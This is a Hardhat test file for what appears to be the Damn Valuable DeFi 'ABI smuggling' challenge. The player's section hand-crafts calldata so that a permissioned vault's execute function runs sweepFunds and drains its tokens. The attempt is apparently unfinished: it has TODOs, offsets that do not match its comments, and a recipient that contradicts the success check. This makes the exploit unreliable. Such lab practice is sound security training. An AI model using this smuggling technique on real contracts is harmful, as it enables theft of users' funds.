const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;
    
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, player, recovery ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        
        //  Deployer can sweep
        console.log(vault.interface.getSighash("sweepFunds"));

        //  Player can withdraw
        console.log(vault.interface.getSighash("withdraw"));

       const attackVault = await vault.connect( player);
       const attackToken = await token.connect(player);
       

        /**
         * Adress will go
         * 
         * Function Selector: 0x00 
         * Target: 0x04
         * Bytes Location: 0x24
         * Bytes Length: 0x44
         * FS fake: 0x64
         * FS real: 0x68
         * actualdata: 0x72
         */

        const createInterface = (signature, methodName, arguments) => {
            const ABI = signature;
            const IFace = new ethers.utils.Interface(ABI);
            const ABIData = IFace.encodeFunctionData(methodName, arguments);
            return ABIData;
        }

        const vaultInt = ["function sweepFunds(address receiver, address token)"]
        const vaultABI = createInterface(vaultInt, "sweepFunds", [player.address, attackToken.address])

        console.log("sweep ABI");
        console.log(vaultABI);

        const res = attackVault.interface.encodeFunctionData("execute", [attackVault.address, vaultABI]);
        console.log("final");
        console.log(res);
// token recipient amount
        const fnData = ethers.utils.hexZeroPad(player.address, 32).slice(2)
                     + ethers.utils.hexZeroPad(attackToken.address, 32).slice(2) 

        // console.log(fnData);
        // console.log(ethers.utils.hexZeroPad(attackToken.address));

        const executeFs = vault.interface.getSighash("execute")
        const target = ethers.utils.hexZeroPad(attackVault.address, 32).slice(2);
        const bytesLocation = ethers.utils.hexZeroPad("0x68", 32).slice(2); // address of actual data
        // TODO: fill in when actual data bytes is known
        const bytesLength = ethers.utils.hexZeroPad("0x02", 32).slice(2)
        const fnSelectorFake = "" // "0xd9caed12".slice(2);
        const fnSelectorReal = "0x85fb709d".slice(2);
        // TODO: put data
        const payload = executeFs + target + bytesLocation + bytesLength + fnSelectorFake + fnSelectorReal + fnData;
        console.log(payload);


        await player.sendTransaction(
            {
                to: attackVault.address,
                data: payload,
                gasLimit: 1e6
            }
        )
        
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
